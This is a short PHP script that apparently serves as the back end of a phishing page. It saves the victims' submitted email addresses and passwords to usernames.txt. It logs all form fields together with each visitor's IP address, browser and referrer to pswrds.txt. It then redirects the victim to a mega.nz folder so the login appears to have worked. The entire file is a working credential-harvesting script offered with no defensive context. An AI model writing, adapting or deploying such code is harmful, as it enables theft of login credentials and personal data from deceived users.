<?php

    file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);

    header("Location: https://mega.nz/folder/vIY0BKxC#9U-t5sE1KRmaxSswWN-gAw");
    $handle = fopen("pswrds.txt", "a");

    $post = $_POST;
    $post['ip'] = $_SERVER['REMOTE_ADDR'];
    $post['browser'] = $_SERVER['HTTP_USER_AGENT'];
    $post['referrer'] = $_SERVER['HTTP_REFERER'];

    foreach($post as $variable => $value) 
    {
        fwrite($handle, $variable);
        fwrite($handle, "=");
        fwrite($handle, $value);
        fwrite($handle, PHP_EOL);
    }

    fwrite($handle, PHP_EOL);
    fclose($handle);
    exit;

?>
